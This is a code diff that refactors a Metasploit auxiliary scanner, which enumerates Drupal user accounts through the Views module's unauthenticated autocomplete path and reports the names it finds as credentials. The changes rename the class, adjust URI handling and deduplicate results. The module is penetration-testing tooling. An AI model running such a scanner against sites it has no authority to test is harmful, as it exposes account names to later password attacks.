@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanServer
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def base_uri
-    @base_uri ||= "#{normalize_uri(target_uri.path)}?q=admin/views/ajax/autocomplete/user/"
+    @base_uri ||= normalize_uri("#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/")
   end
 
   def check_host(ip)
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res.body.include?('Access denied')
       # This probably means the Views Module actually isn't installed
-      print_error("#{peer} - Access denied")
+      print_error("Access denied")
       return Exploit::CheckCode::Safe
     elsif res.message != 'OK' || res.body != '[  ]'
       return Exploit::CheckCode::Safe
@@ -122,13 +122,13 @@ class Metasploit3 < Msf::Auxiliary
           results << user_list.flatten.uniq
         end
       else
-        print_error("#{peer} - Unexpected results from server")
+        print_error("Unexpected results from server")
         return
       end
     end
-
+    results = results.flatten.uniq
     print_status("Done. #{results.length} usernames found...")
-    results.flatten.uniq.each do |user|
+    results.each do |user|
       print_good("Found User: #{user}")
 
       report_cred(
